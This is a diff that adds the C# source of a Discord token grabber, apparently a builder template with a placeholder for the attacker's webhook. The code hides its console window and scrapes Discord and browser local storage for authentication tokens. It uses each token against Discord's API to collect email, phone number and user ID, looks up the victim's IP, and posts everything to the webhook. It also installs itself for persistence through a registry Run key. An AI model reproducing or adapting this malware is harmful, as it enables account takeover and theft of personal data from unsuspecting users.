@@ -1,0 +1,242 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text.RegularExpressions;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Threading;
+using System.Net.Http;
+using System.Net;
+using System.Runtime.InteropServices;
+namespace GrabberBuilderCODE
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        public static List<string> target = new List<string>();
+
+        static void Main()
+        {
+            try
+            {
+                var handle = GetConsoleWindow();
+                ShowWindow(handle, SW_HIDE);
+            }
+
+            catch
+            {
+            }
+
+            Webhook wh = new Webhook("%INSERT_WEBHOOK%");
+            %CODE_BLOCK_1%
+            %CODE_BLOCK_2%
+            string ip = GetIP();
+            
+            List<string> tokens = Grab();
+            foreach(string token in tokens)
+            {
+                Token t = new Token(token);
+                wh.SendToken(t.email, t.phoneNumber, ip, token, t.fullUsername, t.avatarUrl, t.locale, t.creationDate, t.userId);
+            }
+            
+        }
+
+        public static string Extract(string target, string content)
+        {
+            string output = String.Empty;
+            Regex rx = new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")");
+            MatchCollection matches = rx.Matches(content);
+            foreach (Match match in matches)
+            {
+                GroupCollection groups = match.Groups;
+                output = groups[1].Value;
+            }
+            output = output.Replace("\"", "");
+            return output;
+        }
+        private static void Scan()
+        {
+            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            target.Add(roaming + "\\Discord");
+            target.Add(roaming + "\\discordcanary");
+            target.Add(roaming + "\\discordptb");
+            target.Add(roaming + "\\\\Opera Software\\Opera Stable");
+            target.Add(local + "\\Google\\Chrome\\User Data\\Default");
+            target.Add(local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
+            target.Add(local + "\\Yandex\\YandexBrowser\\User Data\\Default");
+        }
+        public static List<string> Grab()
+        {
+            Scan();
+            List<string> tokens = new List<string>();
+            foreach (string x in target)
+            {
+                if (Directory.Exists(x))
+                {
+                    string path = x + "\\Local Storage\\leveldb";
+                    DirectoryInfo leveldb = new DirectoryInfo(path);
+                    foreach (var file in leveldb.GetFiles(false ? "*.log" : "*.ldb"))
+                    {
+                        string contents = file.OpenText().ReadToEnd();
+                        foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                            tokens.Add(match.Value);
+
+                        foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
+                            tokens.Add(match.Value);
+                    }
+                }
+            }
+            return tokens;
+        }
+        public static void StartUp()
+        {
+            try
+            {
+                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
+                string filepath = Path.Combine(Environment.CurrentDirectory, filename);
+                File.Copy(filepath, Path.GetTempPath() + filename);
+
+                string loc = Path.GetTempPath() + filename;
+           
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                {
+                    key.SetValue("Discord Token Grabber", "\"" + loc + "\"");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
+
+        private static string GetIP()
+        {
+            string ip = String.Empty;
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    var response = client.GetAsync("https://ip4.seeip.org");
+                    var final = response.Result.Content.ReadAsStringAsync();
+                    ip = final.Result;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+            return ip;
+        }
+    }
+    class Webhook
+    {
+        private string webhook;
+        public Webhook(string userWebhook)
+        {
+            webhook = userWebhook;
+        }
+        public void Send(string content)
+        {
+            Dictionary<string, string> data = new Dictionary<string, string>
+            {
+                {"content", content }
+            };
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    client.PostAsync(webhook, new FormUrlEncodedContent(data)).GetAwaiter().GetResult();
+                }
+            }
+            catch
+            {
+            }
+
+        }
+        public void SendToken(string email, string phone, string ip, string token, string username, string avatar, string locale, string creation, string id)
+        {
+            string embed = "{\"content\": \"\",  \"embeds\":" + "[{\"color\":1018364,\"fields\":[{\"name\":\"**Account Info**\",\"value\":\"" + "User ID: " + id + "\\nEmail: " + email + "\\nPhone Number: " + phone  + "\\nIP Address: " + ip + "\\nLocale: " + locale + "\",\"inline\":true},{\"name\":\"**Token**\",\"value\":\"" + "`" + token + "`" + "\\nAccount Created: (`" + creation+ "`)" + "\",\"inline\":false}],\"author\":{\"name\":\"" + username + "\",\"icon_url\":\"" + avatar + "\"},\"footer\":{\"text\":\"made by NightfallGT | github.com/NightfallGT\"}}]" + "}";
+            try
+            {
+                var wr = WebRequest.Create(webhook);
+                wr.ContentType = "application/json";
+                wr.Method = "POST";
+                using (var sw = new StreamWriter(wr.GetRequestStream()))
+                    sw.Write(embed);
+                wr.GetResponse();  
+            }
+            catch
+            {
+            }
+        }
+    }
+
+    class Token
+    {
+        private string token;
+        private string jsonResponse = String.Empty;
+
+        public string fullUsername;
+        public string userId;
+        public string avatarUrl;
+        public string phoneNumber;
+        public string email;
+        public string locale;
+        public string creationDate;
+
+        public Token(string inToken)
+        {
+            token = inToken;
+            PostToken();
+        }
+
+        private void PostToken()
+        {
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    client.DefaultRequestHeaders.Add("Authorization",token);
+                    var response = client.GetAsync("https://discordapp.com/api/v8/users/@me");
+                    var final = response.Result.Content.ReadAsStringAsync();
+                    jsonResponse = final.Result;
+                }
+                GetData();
+            }
+            catch
+            {
+            }
+        }
+        private void GetData()
+        {
+            string username = Program.Extract("username", jsonResponse);
+            userId = Program.Extract("id", jsonResponse);
+            string discriminator = Program.Extract("discriminator", jsonResponse);
+            fullUsername = username + "#" + discriminator;
+
+            string avatarId = Program.Extract("avatar", jsonResponse);
+            avatarUrl = "https://cdn.discordapp.com/avatars/" + userId + "/" + avatarId;
+
+            phoneNumber = Program.Extract("phone", jsonResponse);
+            email = Program.Extract("email", jsonResponse);
+
+            locale = Program.Extract("locale", jsonResponse);
+
+            long creation = (Convert.ToInt64(userId) >> 22) + 1420070400000;
+            var result = DateTimeOffset.FromUnixTimeMilliseconds(creation).DateTime;
+            creationDate = result.ToString();
+        }
+    }
+}
